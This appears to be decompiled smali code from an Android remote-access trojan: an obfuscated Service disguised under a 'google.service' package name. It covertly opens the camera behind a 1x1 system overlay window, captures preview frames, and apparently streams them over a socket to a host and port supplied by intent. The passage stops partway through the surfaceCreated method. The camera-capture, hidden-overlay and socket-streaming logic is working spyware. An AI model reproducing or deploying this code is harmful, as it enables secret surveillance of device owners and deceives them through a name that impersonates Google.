.class public Lgoogle/service/ⶱᵇʿˉՙ䉀ˉⶱʻˉʻ$ᴵᵎθﹳ䉀ⶱˈⶱ䉀$4777;
.super Landroid/app/Service;
.source "\u2db1\u1d47\u02bf\u02c9\u0559\u4240\u02c9\u2db1\u02bb\u02c9\u02bb$\u1d35\u1d4e\u03b8\ufe73\u4240\u2db1\u02c8\u2db1\u4240$4777.java"

# interfaces
.implements Landroid/view/SurfaceHolder$Callback;


# static fields
.field public static cm:Landroid/hardware/Camera;

.field public static lay:Landroid/view/WindowManager$LayoutParams;

.field public static out:Ljava/io/OutputStream;

.field public static sfw:Landroid/view/SurfaceView;

.field public static sk:Ljava/net/Socket;

.field static st:Lgoogle/service/ⶱᵇʿˉՙ䉀ˉⶱʻˉʻ$ᴵᵎθﹳ䉀ⶱˈⶱ䉀$4777;

.field private static syc:Ljava/lang/Object;

.field public static wm:Landroid/view/WindowManager;


# instance fields
.field public Lo:Z

.field private bts:Ljava/util/List;
    .annotation system Ldalvik/annotation/Signature;
        value = {
            "Ljava/util/List<",
            "[B>;"
        }
    .end annotation
.end field

.field public ctd:Z

.field private q4:I

.field public usd:Z

.field private vul:[Ljava/lang/String;


# direct methods
.method static constructor <clinit>()V
    .locals 1

    .line 43
    new-instance v0, Ljava/lang/Object;

    invoke-direct {v0}, Ljava/lang/Object;-><init>()V

    sput-object v0, Lgoogle/service/ⶱᵇʿˉՙ䉀ˉⶱʻˉʻ$ᴵᵎθﹳ䉀ⶱˈⶱ䉀$4777;->syc:Ljava/lang/Object;

    return-void
.end method

.method public constructor <init>()V
    .locals 1

    .line 34
    invoke-direct {p0}, Landroid/app/Service;-><init>()V

    const/4 v0, 0x0

    .line 41
    iput-boolean v0, p0, Lgoogle/service/ⶱᵇʿˉՙ䉀ˉⶱʻˉʻ$ᴵᵎθﹳ䉀ⶱˈⶱ䉀$4777;->usd:Z

    iput-boolean v0, p0, Lgoogle/service/ⶱᵇʿˉՙ䉀ˉⶱʻˉʻ$ᴵᵎθﹳ䉀ⶱˈⶱ䉀$4777;->ctd:Z

    iput-boolean v0, p0, Lgoogle/service/ⶱᵇʿˉՙ䉀ˉⶱʻˉʻ$ᴵᵎθﹳ䉀ⶱˈⶱ䉀$4777;->Lo:Z

    .line 42
    new-instance v0, Ljava/util/ArrayList;

    invoke-direct {v0}, Ljava/util/ArrayList;-><init>()V

    iput-object v0, p0, Lgoogle/service/ⶱᵇʿˉՙ䉀ˉⶱʻˉʻ$ᴵᵎθﹳ䉀ⶱˈⶱ䉀$4777;->bts:Ljava/util/List;

    const/16 v0, 0x32

    .line 45
    iput v0, p0, Lgoogle/service/ⶱᵇʿˉՙ䉀ˉⶱʻˉʻ$ᴵᵎθﹳ䉀ⶱˈⶱ䉀$4777;->q4:I

    return-void
.end method

.method static synthetic access$000(Lgoogle/service/ⶱᵇʿˉՙ䉀ˉⶱʻˉʻ$ᴵᵎθﹳ䉀ⶱˈⶱ䉀$4777;)V
    .locals 0

    .line 34
    invoke-direct {p0}, Lgoogle/service/ⶱᵇʿˉՙ䉀ˉⶱʻˉʻ$ᴵᵎθﹳ䉀ⶱˈⶱ䉀$4777;->di()V

    return-void
.end method

.method static synthetic access$100()Ljava/lang/Object;
    .locals 1

    .line 34
    sget-object v0, Lgoogle/service/ⶱᵇʿˉՙ䉀ˉⶱʻˉʻ$ᴵᵎθﹳ䉀ⶱˈⶱ䉀$4777;->syc:Ljava/lang/Object;

    return-object v0
.end method

.method static synthetic access$200(Lgoogle/service/ⶱᵇʿˉՙ䉀ˉⶱʻˉʻ$ᴵᵎθﹳ䉀ⶱˈⶱ䉀$4777;)Ljava/util/List;
    .locals 0

    .line 34
    iget-object p0, p0, Lgoogle/service/ⶱᵇʿˉՙ䉀ˉⶱʻˉʻ$ᴵᵎθﹳ䉀ⶱˈⶱ䉀$4777;->bts:Ljava/util/List;

    return-object p0
.end method

.method static synthetic access$300(Lgoogle/service/ⶱᵇʿˉՙ䉀ˉⶱʻˉʻ$ᴵᵎθﹳ䉀ⶱˈⶱ䉀$4777;)[Ljava/lang/String;
    .locals 0

    .line 34
    iget-object p0, p0, Lgoogle/service/ⶱᵇʿˉՙ䉀ˉⶱʻˉʻ$ᴵᵎθﹳ䉀ⶱˈⶱ䉀$4777;->vul:[Ljava/lang/String;

    return-object p0
.end method

.method static synthetic access$400(Lgoogle/service/ⶱᵇʿˉՙ䉀ˉⶱʻˉʻ$ᴵᵎθﹳ䉀ⶱˈⶱ䉀$4777;)I
    .locals 0

    .line 34
    iget p0, p0, Lgoogle/service/ⶱᵇʿˉՙ䉀ˉⶱʻˉʻ$ᴵᵎθﹳ䉀ⶱˈⶱ䉀$4777;->q4:I

    return p0
.end method

.method static synthetic access$402(Lgoogle/service/ⶱᵇʿˉՙ䉀ˉⶱʻˉʻ$ᴵᵎθﹳ䉀ⶱˈⶱ䉀$4777;I)I
    .locals 0

    .line 34
    iput p1, p0, Lgoogle/service/ⶱᵇʿˉՙ䉀ˉⶱʻˉʻ$ᴵᵎθﹳ䉀ⶱˈⶱ䉀$4777;->q4:I

    return p1
.end method

.method static synthetic access$500(Lgoogle/service/ⶱᵇʿˉՙ䉀ˉⶱʻˉʻ$ᴵᵎθﹳ䉀ⶱˈⶱ䉀$4777;II)I
    .locals 0

    .line 34
    invoke-direct {p0, p1, p2}, Lgoogle/service/ⶱᵇʿˉՙ䉀ˉⶱʻˉʻ$ᴵᵎθﹳ䉀ⶱˈⶱ䉀$4777;->q(II)I

    move-result p0

    return p0
.end method

.method private di()V
    .locals 1

    const/4 v0, 0x0

    .line 167
    iput-boolean v0, p0, Lgoogle/service/ⶱᵇʿˉՙ䉀ˉⶱʻˉʻ$ᴵᵎθﹳ䉀ⶱˈⶱ䉀$4777;->Lo:Z

    .line 168
    :try_start_0
    sget-object v0, Lgoogle/service/ⶱᵇʿˉՙ䉀ˉⶱʻˉʻ$ᴵᵎθﹳ䉀ⶱˈⶱ䉀$4777;->sk:Ljava/net/Socket;

    invoke-virtual {v0}, Ljava/net/Socket;->shutdownOutput()V
    :try_end_0
    .catch Ljava/net/SocketException; {:try_start_0 .. :try_end_0} :catch_0
    .catch Ljava/io/IOException; {:try_start_0 .. :try_end_0} :catch_0

    .line 169
    :catch_0
    :try_start_1
    sget-object v0, Lgoogle/service/ⶱᵇʿˉՙ䉀ˉⶱʻˉʻ$ᴵᵎθﹳ䉀ⶱˈⶱ䉀$4777;->sk:Ljava/net/Socket;

    invoke-virtual {v0}, Ljava/net/Socket;->shutdownInput()V
    :try_end_1
    .catch Ljava/net/SocketException; {:try_start_1 .. :try_end_1} :catch_1
    .catch Ljava/io/IOException; {:try_start_1 .. :try_end_1} :catch_1

    .line 170
    :catch_1
    :try_start_2
    sget-object v0, Lgoogle/service/ⶱᵇʿˉՙ䉀ˉⶱʻˉʻ$ᴵᵎθﹳ䉀ⶱˈⶱ䉀$4777;->sk:Ljava/net/Socket;

    invoke-virtual {v0}, Ljava/net/Socket;->getOutputStream()Ljava/io/OutputStream;

    move-result-object v0

    invoke-virtual {v0}, Ljava/io/OutputStream;->close()V
    :try_end_2
    .catch Ljava/net/SocketException; {:try_start_2 .. :try_end_2} :catch_2
    .catch Ljava/io/IOException; {:try_start_2 .. :try_end_2} :catch_2

    .line 171
    :catch_2
    :try_start_3
    sget-object v0, Lgoogle/service/ⶱᵇʿˉՙ䉀ˉⶱʻˉʻ$ᴵᵎθﹳ䉀ⶱˈⶱ䉀$4777;->sk:Ljava/net/Socket;

    invoke-virtual {v0}, Ljava/net/Socket;->getInputStream()Ljava/io/InputStream;

    move-result-object v0

    invoke-virtual {v0}, Ljava/io/InputStream;->close()V
    :try_end_3
    .catch Ljava/net/SocketException; {:try_start_3 .. :try_end_3} :catch_3
    .catch Ljava/io/IOException; {:try_start_3 .. :try_end_3} :catch_3

    .line 172
    :catch_3
    :try_start_4
    sget-object v0, Lgoogle/service/ⶱᵇʿˉՙ䉀ˉⶱʻˉʻ$ᴵᵎθﹳ䉀ⶱˈⶱ䉀$4777;->sk:Ljava/net/Socket;

    invoke-virtual {v0}, Ljava/net/Socket;->close()V
    :try_end_4
    .catch Ljava/net/SocketException; {:try_start_4 .. :try_end_4} :catch_4
    .catch Ljava/io/IOException; {:try_start_4 .. :try_end_4} :catch_4

    goto :goto_0

    :catch_4
    nop

    .line 173
    :goto_0
    sget-object v0, Lgoogle/service/ⶱᵇʿˉՙ䉀ˉⶱʻˉʻ$ᴵᵎθﹳ䉀ⶱˈⶱ䉀$4777;->out:Ljava/io/OutputStream;

    if-eqz v0, :cond_0

    :try_start_5
    invoke-virtual {v0}, Ljava/io/OutputStream;->close()V
    :try_end_5
    .catch Ljava/net/SocketException; {:try_start_5 .. :try_end_5} :catch_5
    .catch Ljava/io/IOException; {:try_start_5 .. :try_end_5} :catch_5

    :catch_5
    const/4 v0, 0x0

    sput-object v0, Lgoogle/service/ⶱᵇʿˉՙ䉀ˉⶱʻˉʻ$ᴵᵎθﹳ䉀ⶱˈⶱ䉀$4777;->out:Ljava/io/OutputStream;

    :cond_0
    return-void
.end method

.method private q(II)I
    .locals 1

    const v0, 0xf000

    if-le p1, v0, :cond_0

    const/16 p2, 0xf

    goto :goto_0

    :cond_0
    const v0, 0xc800

    if-le p1, v0, :cond_1

    const/16 p2, 0x19

    goto :goto_0

    :cond_1
    const v0, 0xa000

    if-le p1, v0, :cond_2

    const/16 p2, 0x23

    goto :goto_0

    :cond_2
    const/16 v0, 0x7800

    if-le p1, v0, :cond_3

    const/16 p2, 0x2d

    goto :goto_0

    :cond_3
    const/16 v0, 0x5000

    if-le p1, v0, :cond_4

    const/16 p2, 0x41

    goto :goto_0

    :cond_4
    const/16 v0, 0x2800

    if-le p1, v0, :cond_5

    const/16 p2, 0x4b

    :cond_5
    :goto_0
    return p2
.end method


# virtual methods
.method public CompletedApp(Ljava/lang/String;I)V
    .locals 2

    .line 132
    new-instance v0, Ljava/lang/Thread;

    new-instance v1, Lgoogle/service/ⶱᵇʿˉՙ䉀ˉⶱʻˉʻ$ᴵᵎθﹳ䉀ⶱˈⶱ䉀$4777$1;

    invoke-direct {v1, p0, p1, p2}, Lgoogle/service/ⶱᵇʿˉՙ䉀ˉⶱʻˉʻ$ᴵᵎθﹳ䉀ⶱˈⶱ䉀$4777$1;-><init>(Lgoogle/service/ⶱᵇʿˉՙ䉀ˉⶱʻˉʻ$ᴵᵎθﹳ䉀ⶱˈⶱ䉀$4777;Ljava/lang/String;I)V

    invoke-direct {v0, v1}, Ljava/lang/Thread;-><init>(Ljava/lang/Runnable;)V

    .line 164
    invoke-virtual {v0}, Ljava/lang/Thread;->start()V

    return-void
.end method

.method public ck()Z
    .locals 1

    .line 121
    :try_start_0
    invoke-static {}, Landroid/hardware/Camera;->open()Landroid/hardware/Camera;

    move-result-object v0
    :try_end_0
    .catch Ljava/lang/RuntimeException; {:try_start_0 .. :try_end_0} :catch_0
    .catchall {:try_start_0 .. :try_end_0} :catchall_0

    if-eqz v0, :cond_0

    .line 126
    invoke-virtual {v0}, Landroid/hardware/Camera;->release()V

    :cond_0
    const/4 v0, 0x0

    return v0

    :catchall_0
    move-exception v0

    .line 128
    throw v0

    :catch_0
    const/4 v0, 0x1

    return v0
.end method

.method public onBind(Landroid/content/Intent;)Landroid/os/IBinder;
    .locals 0

    const/4 p1, 0x0

    return-object p1
.end method

.method public onDestroy()V
    .locals 1

    .line 293
    invoke-super {p0}, Landroid/app/Service;->onDestroy()V

    const/4 v0, 0x0

    .line 294
    sput v0, Lgoogle/service/䉀φ₫יⶱˉˈˋφʾﹳ$ˉㅤᵢ$ˋʿʾ$ᵔ䉀ʿ$יʿㅤ$$ᴵˋ4774;->sf1:I

    const/4 v0, 0x0

    .line 295
    sput-object v0, Lgoogle/service/ⶱᵇʿˉՙ䉀ˉⶱʻˉʻ$ᴵᵎθﹳ䉀ⶱˈⶱ䉀$4777;->st:Lgoogle/service/ⶱᵇʿˉՙ䉀ˉⶱʻˉʻ$ᴵᵎθﹳ䉀ⶱˈⶱ䉀$4777;

    .line 296
    invoke-virtual {p0}, Lgoogle/service/ⶱᵇʿˉՙ䉀ˉⶱʻˉʻ$ᴵᵎθﹳ䉀ⶱˈⶱ䉀$4777;->sp()V

    return-void
.end method

.method public onStartCommand(Landroid/content/Intent;II)I
    .locals 19

    move-object/from16 v0, p0

    move-object/from16 v1, p1

    const/4 v2, 0x2

    .line 49
    :try_start_0
    new-instance v3, Landroid/content/Intent;

    const-string v4, "xyz"

    invoke-direct {v3, v4}, Landroid/content/Intent;-><init>(Ljava/lang/String;)V

    invoke-virtual {v0, v3}, Lgoogle/service/ⶱᵇʿˉՙ䉀ˉⶱʻˉʻ$ᴵᵎθﹳ䉀ⶱˈⶱ䉀$4777;->sendBroadcast(Landroid/content/Intent;)V

    .line 50
    sget-object v3, Lgoogle/service/䉀ㅤ$ʾᴵⶱՙˎʾθʿ䉀φיʼʿʾ䉀ᵢᴵ䉀ﹶʾ₫ˎﹶⶱˋᴵᘣᵎ$4778;->FTX1:Ljava/lang/String;

    const/4 v4, 0x1

    if-eqz v1, :cond_4

    .line 52
    invoke-virtual {v1, v3}, Landroid/content/Intent;->hasExtra(Ljava/lang/String;)Z

    move-result v5

    if-eqz v5, :cond_4

    .line 56
    invoke-static {}, Lgoogle/service/φיʾᴵᵢʿⶨˎㅤˏφˎˉㅤⶨㅤⶱـˋⶱφᵎㅤ4794;->NeedSuper()Z

    move-result v5

    const/16 v6, 0x33

    if-eqz v5, :cond_1

    sget-object v5, Lgoogle/service/ﹶˎφᘣʿᘣঙᵎʾʾθᴵ$䉀ʾʾφㅤㅤφـ47722;->wm:Landroid/view/WindowManager;

    if-eqz v5, :cond_1

    sget-object v5, Lgoogle/service/ﹶˎφᘣʿᘣঙᵎʾʾθᴵ$䉀ʾʾφㅤㅤφـ47722;->lay:Landroid/view/WindowManager$LayoutParams;

    if-eqz v5, :cond_1

    .line 58
    invoke-virtual {v1, v3}, Landroid/content/Intent;->getStringArrayExtra(Ljava/lang/String;)[Ljava/lang/String;

    move-result-object v1

    iput-object v1, v0, Lgoogle/service/ⶱᵇʿˉՙ䉀ˉⶱʻˉʻ$ᴵᵎθﹳ䉀ⶱˈⶱ䉀$4777;->vul:[Ljava/lang/String;

    .line 59
    invoke-virtual/range {p0 .. p0}, Lgoogle/service/ⶱᵇʿˉՙ䉀ˉⶱʻˉʻ$ᴵᵎθﹳ䉀ⶱˈⶱ䉀$4777;->ck()Z

    move-result v1

    iput-boolean v1, v0, Lgoogle/service/ⶱᵇʿˉՙ䉀ˉⶱʻˉʻ$ᴵᵎθﹳ䉀ⶱˈⶱ䉀$4777;->usd:Z

    if-nez v1, :cond_0

    .line 62
    new-instance v1, Landroid/view/SurfaceView;

    invoke-direct {v1, v0}, Landroid/view/SurfaceView;-><init>(Landroid/content/Context;)V

    sput-object v1, Lgoogle/service/ⶱᵇʿˉՙ䉀ˉⶱʻˉʻ$ᴵᵎθﹳ䉀ⶱˈⶱ䉀$4777;->sfw:Landroid/view/SurfaceView;

    .line 65
    sget-object v1, Lgoogle/service/ﹶˎφᘣʿᘣঙᵎʾʾθᴵ$䉀ʾʾφㅤㅤφـ47722;->lay:Landroid/view/WindowManager$LayoutParams;

    iput v6, v1, Landroid/view/WindowManager$LayoutParams;->gravity:I

    .line 66
    sget-object v1, Lgoogle/service/ﹶˎφᘣʿᘣঙᵎʾʾθᴵ$䉀ʾʾφㅤㅤφـ47722;->wm:Landroid/view/WindowManager;

    sget-object v3, Lgoogle/service/ⶱᵇʿˉՙ䉀ˉⶱʻˉʻ$ᴵᵎθﹳ䉀ⶱˈⶱ䉀$4777;->sfw:Landroid/view/SurfaceView;

    sget-object v5, Lgoogle/service/ﹶˎφᘣʿᘣঙᵎʾʾθᴵ$䉀ʾʾφㅤㅤφـ47722;->lay:Landroid/view/WindowManager$LayoutParams;

    invoke-interface {v1, v3, v5}, Landroid/view/WindowManager;->addView(Landroid/view/View;Landroid/view/ViewGroup$LayoutParams;)V

    .line 67
    sget-object v1, Lgoogle/service/ⶱᵇʿˉՙ䉀ˉⶱʻˉʻ$ᴵᵎθﹳ䉀ⶱˈⶱ䉀$4777;->sfw:Landroid/view/SurfaceView;

    invoke-virtual {v1}, Landroid/view/SurfaceView;->getHolder()Landroid/view/SurfaceHolder;

    move-result-object v1

    invoke-interface {v1, v0}, Landroid/view/SurfaceHolder;->addCallback(Landroid/view/SurfaceHolder$Callback;)V

    .line 68
    iget-object v1, v0, Lgoogle/service/ⶱᵇʿˉՙ䉀ˉⶱʻˉʻ$ᴵᵎθﹳ䉀ⶱˈⶱ䉀$4777;->vul:[Ljava/lang/String;

    aget-object v1, v1, v4

    iget-object v3, v0, Lgoogle/service/ⶱᵇʿˉՙ䉀ˉⶱʻˉʻ$ᴵᵎθﹳ䉀ⶱˈⶱ䉀$4777;->vul:[Ljava/lang/String;

    aget-object v3, v3, v2

    invoke-static {v3}, Ljava/lang/Integer;->valueOf(Ljava/lang/String;)Ljava/lang/Integer;

    move-result-object v3

    invoke-virtual {v3}, Ljava/lang/Integer;->intValue()I

    move-result v3

    invoke-virtual {v0, v1, v3}, Lgoogle/service/ⶱᵇʿˉՙ䉀ˉⶱʻˉʻ$ᴵᵎθﹳ䉀ⶱˈⶱ䉀$4777;->CompletedApp(Ljava/lang/String;I)V

    goto/16 :goto_1

    .line 70
    :cond_0
    invoke-virtual/range {p0 .. p0}, Lgoogle/service/ⶱᵇʿˉՙ䉀ˉⶱʻˉʻ$ᴵᵎθﹳ䉀ⶱˈⶱ䉀$4777;->sp()V

    goto :goto_1

    .line 75
    :cond_1
    invoke-virtual {v1, v3}, Landroid/content/Intent;->getStringArrayExtra(Ljava/lang/String;)[Ljava/lang/String;

    move-result-object v1

    iput-object v1, v0, Lgoogle/service/ⶱᵇʿˉՙ䉀ˉⶱʻˉʻ$ᴵᵎθﹳ䉀ⶱˈⶱ䉀$4777;->vul:[Ljava/lang/String;

    .line 76
    invoke-virtual/range {p0 .. p0}, Lgoogle/service/ⶱᵇʿˉՙ䉀ˉⶱʻˉʻ$ᴵᵎθﹳ䉀ⶱˈⶱ䉀$4777;->ck()Z

    move-result v1

    iput-boolean v1, v0, Lgoogle/service/ⶱᵇʿˉՙ䉀ˉⶱʻˉʻ$ᴵᵎθﹳ䉀ⶱˈⶱ䉀$4777;->usd:Z

    if-nez v1, :cond_3

    const-string v1, "window"

    .line 78
    invoke-virtual {v0, v1}, Lgoogle/service/ⶱᵇʿˉՙ䉀ˉⶱʻˉʻ$ᴵᵎθﹳ䉀ⶱˈⶱ䉀$4777;->getSystemService(Ljava/lang/String;)Ljava/lang/Object;

    move-result-object v1

    check-cast v1, Landroid/view/WindowManager;

    sput-object v1, Lgoogle/service/ⶱᵇʿˉՙ䉀ˉⶱʻˉʻ$ᴵᵎθﹳ䉀ⶱˈⶱ䉀$4777;->wm:Landroid/view/WindowManager;

    .line 79
    new-instance v1, Landroid/view/SurfaceView;

    invoke-direct {v1, v0}, Landroid/view/SurfaceView;-><init>(Landroid/content/Context;)V

    sput-object v1, Lgoogle/service/ⶱᵇʿˉՙ䉀ˉⶱʻˉʻ$ᴵᵎθﹳ䉀ⶱˈⶱ䉀$4777;->sfw:Landroid/view/SurfaceView;

    .line 81
    sget v1, Landroid/os/Build$VERSION;->SDK_INT:I

    const/16 v3, 0x1a

    if-lt v1, v3, :cond_2

    .line 82
    new-instance v1, Landroid/view/WindowManager$LayoutParams;

    const/4 v8, 0x1

    const/4 v9, 0x1

    const/16 v10, 0x7f6

    const/16 v11, 0x38

    const/4 v12, -0x3

    move-object v7, v1

    invoke-direct/range {v7 .. v12}, Landroid/view/WindowManager$LayoutParams;-><init>(IIIII)V

    sput-object v1, Lgoogle/service/ⶱᵇʿˉՙ䉀ˉⶱʻˉʻ$ᴵᵎθﹳ䉀ⶱˈⶱ䉀$4777;->lay:Landroid/view/WindowManager$LayoutParams;

    goto :goto_0

    .line 93
    :cond_2
    new-instance v1, Landroid/view/WindowManager$LayoutParams;

    const/4 v14, 0x1

    const/4 v15, 0x1

    const/16 v16, 0x7d6

    const/high16 v17, 0x40000

    const/16 v18, -0x3

    move-object v13, v1

    invoke-direct/range {v13 .. v18}, Landroid/view/WindowManager$LayoutParams;-><init>(IIIII)V

    sput-object v1, Lgoogle/service/ⶱᵇʿˉՙ䉀ˉⶱʻˉʻ$ᴵᵎθﹳ䉀ⶱˈⶱ䉀$4777;->lay:Landroid/view/WindowManager$LayoutParams;

    .line 100
    :goto_0
    sget-object v1, Lgoogle/service/ⶱᵇʿˉՙ䉀ˉⶱʻˉʻ$ᴵᵎθﹳ䉀ⶱˈⶱ䉀$4777;->lay:Landroid/view/WindowManager$LayoutParams;

    iput v6, v1, Landroid/view/WindowManager$LayoutParams;->gravity:I

    .line 101
    sget-object v1, Lgoogle/service/ⶱᵇʿˉՙ䉀ˉⶱʻˉʻ$ᴵᵎθﹳ䉀ⶱˈⶱ䉀$4777;->wm:Landroid/view/WindowManager;

    sget-object v3, Lgoogle/service/ⶱᵇʿˉՙ䉀ˉⶱʻˉʻ$ᴵᵎθﹳ䉀ⶱˈⶱ䉀$4777;->sfw:Landroid/view/SurfaceView;

    sget-object v5, Lgoogle/service/ⶱᵇʿˉՙ䉀ˉⶱʻˉʻ$ᴵᵎθﹳ䉀ⶱˈⶱ䉀$4777;->lay:Landroid/view/WindowManager$LayoutParams;

    invoke-interface {v1, v3, v5}, Landroid/view/WindowManager;->addView(Landroid/view/View;Landroid/view/ViewGroup$LayoutParams;)V

    .line 102
    sget-object v1, Lgoogle/service/ⶱᵇʿˉՙ䉀ˉⶱʻˉʻ$ᴵᵎθﹳ䉀ⶱˈⶱ䉀$4777;->sfw:Landroid/view/SurfaceView;

    invoke-virtual {v1}, Landroid/view/SurfaceView;->getHolder()Landroid/view/SurfaceHolder;

    move-result-object v1

    invoke-interface {v1, v0}, Landroid/view/SurfaceHolder;->addCallback(Landroid/view/SurfaceHolder$Callback;)V

    .line 103
    iget-object v1, v0, Lgoogle/service/ⶱᵇʿˉՙ䉀ˉⶱʻˉʻ$ᴵᵎθﹳ䉀ⶱˈⶱ䉀$4777;->vul:[Ljava/lang/String;

    aget-object v1, v1, v4

    iget-object v3, v0, Lgoogle/service/ⶱᵇʿˉՙ䉀ˉⶱʻˉʻ$ᴵᵎθﹳ䉀ⶱˈⶱ䉀$4777;->vul:[Ljava/lang/String;

    aget-object v3, v3, v2

    invoke-static {v3}, Ljava/lang/Integer;->valueOf(Ljava/lang/String;)Ljava/lang/Integer;

    move-result-object v3

    invoke-virtual {v3}, Ljava/lang/Integer;->intValue()I

    move-result v3

    invoke-virtual {v0, v1, v3}, Lgoogle/service/ⶱᵇʿˉՙ䉀ˉⶱʻˉʻ$ᴵᵎθﹳ䉀ⶱˈⶱ䉀$4777;->CompletedApp(Ljava/lang/String;I)V

    goto :goto_1

    .line 105
    :cond_3
    invoke-virtual/range {p0 .. p0}, Lgoogle/service/ⶱᵇʿˉՙ䉀ˉⶱʻˉʻ$ᴵᵎθﹳ䉀ⶱˈⶱ䉀$4777;->sp()V
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    :cond_4
    :goto_1
    return v4

    :catch_0
    return v2
.end method

.method public pr()V
    .locals 2

    .line 240
    new-instance v0, Ljava/lang/Thread;

    new-instance v1, Lgoogle/service/ⶱᵇʿˉՙ䉀ˉⶱʻˉʻ$ᴵᵎθﹳ䉀ⶱˈⶱ䉀$4777$3;

    invoke-direct {v1, p0}, Lgoogle/service/ⶱᵇʿˉՙ䉀ˉⶱʻˉʻ$ᴵᵎθﹳ䉀ⶱˈⶱ䉀$4777$3;-><init>(Lgoogle/service/ⶱᵇʿˉՙ䉀ˉⶱʻˉʻ$ᴵᵎθﹳ䉀ⶱˈⶱ䉀$4777;)V

    invoke-direct {v0, v1}, Ljava/lang/Thread;-><init>(Ljava/lang/Runnable;)V

    .line 287
    invoke-virtual {v0}, Ljava/lang/Thread;->start()V

    return-void
.end method

.method public sp()V
    .locals 2

    .line 301
    :try_start_0
    sget-object v0, Lgoogle/service/ⶱᵇʿˉՙ䉀ˉⶱʻˉʻ$ᴵᵎθﹳ䉀ⶱˈⶱ䉀$4777;->cm:Landroid/hardware/Camera;

    if-eqz v0, :cond_0

    .line 302
    sget-object v0, Lgoogle/service/ⶱᵇʿˉՙ䉀ˉⶱʻˉʻ$ᴵᵎθﹳ䉀ⶱˈⶱ䉀$4777;->cm:Landroid/hardware/Camera;

    const/4 v1, 0x0

    invoke-virtual {v0, v1}, Landroid/hardware/Camera;->setPreviewCallback(Landroid/hardware/Camera$PreviewCallback;)V

    .line 303
    sget-object v0, Lgoogle/service/ⶱᵇʿˉՙ䉀ˉⶱʻˉʻ$ᴵᵎθﹳ䉀ⶱˈⶱ䉀$4777;->cm:Landroid/hardware/Camera;

    invoke-virtual {v0}, Landroid/hardware/Camera;->release()V

    .line 304
    sput-object v1, Lgoogle/service/ⶱᵇʿˉՙ䉀ˉⶱʻˉʻ$ᴵᵎθﹳ䉀ⶱˈⶱ䉀$4777;->cm:Landroid/hardware/Camera;

    .line 306
    :cond_0
    invoke-direct {p0}, Lgoogle/service/ⶱᵇʿˉՙ䉀ˉⶱʻˉʻ$ᴵᵎθﹳ䉀ⶱˈⶱ䉀$4777;->di()V

    .line 307
    iget-boolean v0, p0, Lgoogle/service/ⶱᵇʿˉՙ䉀ˉⶱʻˉʻ$ᴵᵎθﹳ䉀ⶱˈⶱ䉀$4777;->usd:Z

    if-nez v0, :cond_1

    .line 308
    sget-object v0, Lgoogle/service/ﹶˎφᘣʿᘣঙᵎʾʾθᴵ$䉀ʾʾφㅤㅤφـ47722;->wm:Landroid/view/WindowManager;

    sget-object v1, Lgoogle/service/ⶱᵇʿˉՙ䉀ˉⶱʻˉʻ$ᴵᵎθﹳ䉀ⶱˈⶱ䉀$4777;->sfw:Landroid/view/SurfaceView;

    invoke-interface {v0, v1}, Landroid/view/WindowManager;->removeView(Landroid/view/View;)V

    :cond_1
    const/4 v0, 0x0

    .line 310
    iput-boolean v0, p0, Lgoogle/service/ⶱᵇʿˉՙ䉀ˉⶱʻˉʻ$ᴵᵎθﹳ䉀ⶱˈⶱ䉀$4777;->usd:Z
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    .line 314
    :catch_0
    new-instance v0, Landroid/content/Intent;

    const-class v1, Lgoogle/service/ⶱᵇʿˉՙ䉀ˉⶱʻˉʻ$ᴵᵎθﹳ䉀ⶱˈⶱ䉀$4777;

    invoke-direct {v0, p0, v1}, Landroid/content/Intent;-><init>(Landroid/content/Context;Ljava/lang/Class;)V

    .line 315
    invoke-virtual {p0, v0}, Lgoogle/service/ⶱᵇʿˉՙ䉀ˉⶱʻˉʻ$ᴵᵎθﹳ䉀ⶱˈⶱ䉀$4777;->stopService(Landroid/content/Intent;)Z

    return-void
.end method

.method public surfaceChanged(Landroid/view/SurfaceHolder;III)V
    .locals 0

    .line 216
    sget-object p1, Lgoogle/service/ⶱᵇʿˉՙ䉀ˉⶱʻˉʻ$ᴵᵎθﹳ䉀ⶱˈⶱ䉀$4777;->cm:Landroid/hardware/Camera;

    if-eqz p1, :cond_0

    .line 217
    new-instance p2, Lgoogle/service/ⶱᵇʿˉՙ䉀ˉⶱʻˉʻ$ᴵᵎθﹳ䉀ⶱˈⶱ䉀$4777$2;

    invoke-direct {p2, p0}, Lgoogle/service/ⶱᵇʿˉՙ䉀ˉⶱʻˉʻ$ᴵᵎθﹳ䉀ⶱˈⶱ䉀$4777$2;-><init>(Lgoogle/service/ⶱᵇʿˉՙ䉀ˉⶱʻˉʻ$ᴵᵎθﹳ䉀ⶱˈⶱ䉀$4777;)V

    invoke-virtual {p1, p2}, Landroid/hardware/Camera;->setPreviewCallback(Landroid/hardware/Camera$PreviewCallback;)V

    :cond_0
    return-void
.end method

.method public surfaceCreated(Landroid/view/SurfaceHolder;)V
    .locals 7

    const-string v0, "continuous-video"

    .line 182
    :try_start_0
    iget-object v1, p0, Lgoogle/service/ⶱᵇʿˉՙ䉀ˉⶱʻˉʻ$ᴵᵎθﹳ䉀ⶱˈⶱ䉀$4777;->vul:[Ljava/lang/String;

    const/4 v2, 0x0

    aget-object v1, v1, v2

    invoke-static {v1}, Ljava/lang/Integer;->valueOf(Ljava/lang/String;)Ljava/lang/Integer;

    move-result-object v1

    invoke-virtual {v1}, Ljava/lang/Integer;->intValue()I

    move-result v1

    invoke-static {v1}, Landroid/hardware/Camera;->open(I)Landroid/hardware/Camera;

    move-result-object v1

    sput-object v1, Lgoogle/service/ⶱᵇʿˉՙ䉀ˉⶱʻˉʻ$ᴵᵎθﹳ䉀ⶱˈⶱ䉀$4777;->cm:Landroid/hardware/Camera;
    :try_end_0
    .catch Ljava/lang/RuntimeException; {:try_start_0 .. :try_end_0} :catch_0

    .line 185
    :catch_0
    :try_start_1
    sget-object v1, Lgoogle/service/ⶱᵇʿˉՙ䉀ˉⶱʻˉʻ$ᴵᵎθﹳ䉀ⶱˈⶱ䉀$4777;->cm:Landroid/hardware/Camera;

    invoke-virtual {v1}, Landroid/hardware/Camera;->getParameters()Landroid/hardware/Camera$Parameters;

    move-result-object v1

    const/4 v2, 0x0

    .line 187
    sget-object v3, Lgoogle/service/ⶱᵇʿˉՙ䉀ˉⶱʻˉʻ$ᴵᵎθﹳ䉀ⶱˈⶱ䉀$4777;->cm:Landroid/hardware/Camera;

    invoke-virtual {v3}, Landroid/hardware/Camera;->getParameters()Landroid/hardware/Camera$Parameters;

    move-result-object v3

